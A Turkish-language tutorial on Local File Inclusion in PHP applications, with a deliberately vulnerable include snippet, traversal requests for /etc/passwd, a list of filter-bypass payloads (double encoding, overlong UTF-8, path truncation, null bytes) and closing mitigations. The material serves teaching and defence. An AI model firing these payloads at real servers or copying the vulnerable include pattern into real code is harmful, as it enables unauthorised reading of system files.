# Local File Inclusion (LFI) Nedir
Local File Inclusion, web uygulamalarında kullanıcıdan alınan verilerin dosya yolu olarak işlenmesi sırasında ortaya çıkan bir zafiyetdir. Saldırgan, LFI sayesinde sunucudaki yerel dosyalara erişebilir ve hassas bilgileri elde edebilir.

Örnek olarak bir PHP uygulamasında şöyle bir kod olduğunu düşünelim:
```php
<?php
// index.php
$page = $_GET['page'];
include($page);
?>
```

Bu kod, URL’den gelen page parametresini doğrudan include ediyor. Örneğin:
```
http://example.com/index.php?page=about
```

about.php dosyasını sunucuya dahil eder. Ancak saldırgan parametreyi değiştirerek kritik sistem dosyalarına erişebilir:
```
http://example.com/index.php?page=../../../../etc/passwd
```

Bu durumda sunucu /etc/passwd dosyasının içeriğini döndürebilir.

# Bypass Teknikleri
## Double Encoding
```
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

## UTF-8 Encoding
```
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

## Path Truncation
```
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

## Filter Bypass
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

# LFI Açığını Önlemek
### Input Validation & Whitelisting
Kullanıcıdan gelen dosya adlarını direkt include etme. Sadece izin verilen dosyalar:
```php
$allowed_pages = ['about', 'contact', 'home'];
if(in_array($_GET['page'], $allowed_pages)) {
    include($_GET['page']);
} else {
    echo "Sayfa bulunamadı";
}
```

## Dizin Sabitleme (Directory Traversal Protection)
Kullanıcı inputunu direkt dosya yolu olarak kullanmak yerine, sabit dizinle birleştir:
```php
include(__DIR__ . '/pages/' . basename($_GET['page']));
```